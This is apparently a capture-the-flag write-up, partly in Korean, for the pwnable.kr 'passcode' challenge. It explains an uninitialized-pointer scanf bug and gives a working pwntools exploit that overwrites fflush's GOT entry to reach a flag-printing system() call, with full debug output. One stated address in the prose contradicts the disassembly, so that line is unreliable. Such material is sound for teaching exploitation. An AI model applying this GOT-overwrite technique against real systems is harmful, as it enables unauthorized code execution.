# passcode

## passcode.c
```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

```asm
   0x08048564 <+0>:	push   ebp
   0x08048565 <+1>:	mov    ebp,esp
   0x08048567 <+3>:	sub    esp,0x28
   0x0804856a <+6>:	mov    eax,0x8048770
   0x0804856f <+11>:	mov    DWORD PTR [esp],eax
   0x08048572 <+14>:	call   0x8048420 <printf@plt>
   0x08048577 <+19>:	mov    eax,0x8048783
   0x0804857c <+24>:	mov    edx,DWORD PTR [ebp-0x10]
   0x0804857f <+27>:	mov    DWORD PTR [esp+0x4],edx
   0x08048583 <+31>:	mov    DWORD PTR [esp],eax
   0x08048586 <+34>:	call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:	mov    eax,ds:0x804a02c
   0x08048590 <+44>:	mov    DWORD PTR [esp],eax
   0x08048593 <+47>:	call   0x8048430 <fflush@plt>
   0x08048598 <+52>:	mov    eax,0x8048786
   0x0804859d <+57>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+60>:	call   0x8048420 <printf@plt>
   0x080485a5 <+65>:	mov    eax,0x8048783
   0x080485aa <+70>:	mov    edx,DWORD PTR [ebp-0xc]
   0x080485ad <+73>:	mov    DWORD PTR [esp+0x4],edx
   0x080485b1 <+77>:	mov    DWORD PTR [esp],eax
   0x080485b4 <+80>:	call   0x80484a0 <__isoc99_scanf@plt>
---Type <return> to continue, or q <return> to quit---
   0x080485b9 <+85>:	mov    DWORD PTR [esp],0x8048799
   0x080485c0 <+92>:	call   0x8048450 <puts@plt>
   0x080485c5 <+97>:	cmp    DWORD PTR [ebp-0x10],0x528e6
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
   0x080485d7 <+115>:	mov    DWORD PTR [esp],0x80487a5
   0x080485de <+122>:	call   0x8048450 <puts@plt>
   0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:	call   0x8048460 <system@plt>
   0x080485ef <+139>:	leave  
   0x080485f0 <+140>:	ret    
   0x080485f1 <+141>:	mov    DWORD PTR [esp],0x80487bd
   0x080485f8 <+148>:	call   0x8048450 <puts@plt>
   0x080485fd <+153>:	mov    DWORD PTR [esp],0x0
   0x08048604 <+160>:	call   0x8048480 <exit@plt>
```

`login()`을 보면 `scanf()`의 두번째 인수에 `&`를 붙이지 않아 `passcode1`의 주소값이 아니라 `passcode1`의 값을 주소로 인식해 그 주소에 값을 저장하게 된다.

또, `welcome()` 에서 이름을 100 바이트만큼 받는데, 함수 호출이 끝나고 스택을 정리할 때 `esp`의 값만 올리기 때문에 안의 값은 남아있다. 

이를 이용하면 `login()`의 `passcode1` 자리에 다른 주소를 넣어두고, 그 주소로 `scanf()`를 통해 값을 쓸 수 있다. 

`scanf()`의 뒤에 있는 `fflush()`나 `printf()`의 `got`를 `passcode1`에 넣어두고 그 주소에 `login+115`의 주소를 넣어두면 

```c
                printf("Login OK!\n");
                system("/bin/cat flag");
```
를 실행할 것이다.

## exploit.py

먼저 필요한 것은 `fflush()`의 `got`, 덮어쓸 주소, `welcome()`의 `name`과 `login()`의 `passcode1`의 주소차이다.

`fflush@got.plt = 0x804a004`

`login+115 = 0x8048430`

`&passcode1 = ebp-0x10`

`name = ebp-0x70`

`&passcode1 - name = 0x60`

```python
from pwn import *

context.log_level = 'debug'

shell = ssh('passcode', 'pwnable.kr', 2222, 'guest')

r = shell.run('./passcode')

r.recvuntil('name : ')

got = 0x804a004

name = 'a'*96 + p32(got)

system = str(0x080485d7)

r.sendline(name)

r.recv()

r.sendline(system)

r.interactive()

```

```bash
[+] Connecting to pwnable.kr on port 2222: Done
[*] passcode@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.10.0
    ASLR:     Enabled
[+] Opening new channel: 'stty raw -ctlecho -echo; cd . >/dev/null 2>&1;./passcode': Done
[DEBUG] Received 0x39 bytes:
    "Toddler's Secure Login System 1.0 beta.\n"
    'enter you name : '
[DEBUG] Sent 0x65 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000060  04 a0 04 08  0a                                     │····│·│
    00000065
[DEBUG] Received 0x80 bytes:
    00000000  57 65 6c 63  6f 6d 65 20  61 61 61 61  61 61 61 61  │Welc│ome │aaaa│aaaa│
    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000060  61 61 61 61  61 61 61 61  04 a0 04 08  21 0a 65 6e  │aaaa│aaaa│····│!·en│
    00000070  74 65 72 20  70 61 73 73  63 6f 64 65  31 20 3a 20  │ter │pass│code│1 : │
    00000080
[DEBUG] Sent 0xa bytes:
    '134514135\n'
[DEBUG] Received 0x71 bytes:
    'Login OK!\n'
    'Sorry mom.. I got confused about scanf usage :(\n'
    'Now I can safely trust you that you have credential :)\n'
[*] Closed SSH channel with pwnable.kr
```